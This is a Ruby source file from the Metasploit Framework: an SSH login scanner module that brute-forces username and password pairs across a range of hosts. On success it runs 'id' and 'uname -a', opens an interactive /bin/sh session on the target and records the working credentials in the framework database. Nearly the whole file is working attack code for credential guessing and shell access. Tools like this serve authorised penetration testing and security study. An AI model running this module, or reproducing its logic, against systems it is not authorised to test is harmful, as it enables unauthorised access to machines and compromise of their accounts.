##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'net/ssh'
require 'msf/base/sessions/command_shell_options'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Report

	include Msf::Sessions::CommandShellOptions

	attr_accessor :ssh_socket, :good_credentials

	def initialize
		super(
			'Name'        => 'SSH Login Check Scanner',
			'Version'     => '$Revision$',
			'Description' => %q{
				This module will test ssh logins on a range of machines and
				report successful logins.  If you have loaded a database plugin
				and connected to a database this module will record successful
				logins and hosts so you can track your access.
			},
			'Author'      => ['todb'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptString.new('USERNAME', [ false, 'The username to authenticate as' ]),
				OptString.new('PASSWORD', [ false, 'The password for the specified username' ]),
				Opt::RPORT(22)
			], self.class
		)

		register_advanced_options(
			[
				OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false])
			]
		)

		deregister_options('RHOST')

		@good_credentials = {}

	end

	def rport
		datastore['RPORT']
	end

	def do_login(ip,user,pass,port)
		opt_hash = {
			:auth_methods => ['password','keyboard-interactive'],
			:msframework  => framework,
			:msfmodule    => self,
			:port         => port,
			:password     => pass
		}

		opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']

		begin
			self.ssh_socket = Net::SSH.start(
				ip,
				user,
				opt_hash
			)
		rescue Rex::ConnectionError
			return :connection_error
		rescue Net::SSH::Disconnect, ::EOFError
			return :connection_disconnect
		rescue Net::SSH::Exception
			return [:fail,nil] # For whatever reason. Can't tell if passwords are on/off without timing responses.
		end

		if self.ssh_socket
			proof = ''
			begin
				Timeout.timeout(5) do
					proof = self.ssh_socket.exec!("id\nuname -a").to_s
					if(proof !~ /id=/)
						proof << self.ssh_socket.exec!("help\n?\n\n\n").to_s
					end
				end
			rescue ::Exception
			end

			# Create a new session
			conn = Net::SSH::CommandStream.new(self.ssh_socket, '/bin/sh', true)
			sess = Msf::Sessions::CommandShell.new(conn.lsock)
			sess.set_from_exploit(self)
			sess.info = "SSH #{user}:#{pass} (#{ip}:#{port})"
			framework.sessions.register(sess)
			sess.process_autoruns(datastore)

			return [:success, proof]
		else
			return [:fail, nil]
		end
	end

	def do_report(ip,user,pass,port,proof)
		report_service(
			:host => ip,
			:port => rport,
			:name => 'ssh'
		)
		report_auth_info(
			:host => ip,
			:proto => 'ssh',
			:user => user,
			:pass => pass,
			:targ_host => ip,
			:targ_port => datastore['RPORT'],
			:proof => proof
		)
	end

	def run_host(ip)
		print_status("#{ip}:#{rport} - SSH - Starting buteforce")
		each_user_pass do |user, pass|
			userpass_sleep_interval unless self.credentials_tried.empty?
			this_cred = [user,ip,rport].join(":")
			next if self.credentials_tried[this_cred] == pass || self.credentials_good[this_cred]
			self.credentials_tried[this_cred] = pass

			vprint_status("#{ip}:#{rport} - SSH - Trying: username: '#{user}' with password: '#{pass}'")
			ret,proof = do_login(ip,user,pass,rport)
			case ret
			when :success
				print_good "#{ip}:#{rport} - SSH - Success: '#{user}':'#{pass}' '#{proof.to_s.gsub(/[\r\n\e\b\a]/, ' ')}'"
				self.credentials_good[this_cred] = pass
				do_report(ip,user,pass,rport,proof)
			when :connection_error
				vprint_error "#{ip}:#{rport} - SSH - Could not connect"
				return
			when :connection_disconnect
				vprint_error "#{ip}:#{rport} - SSH - Connection timed out"
				return
			when :fail
				vprint_error "#{ip}:#{rport} - SSH - Failed: '#{user}':'#{pass}'"
			end
		end
	end

end

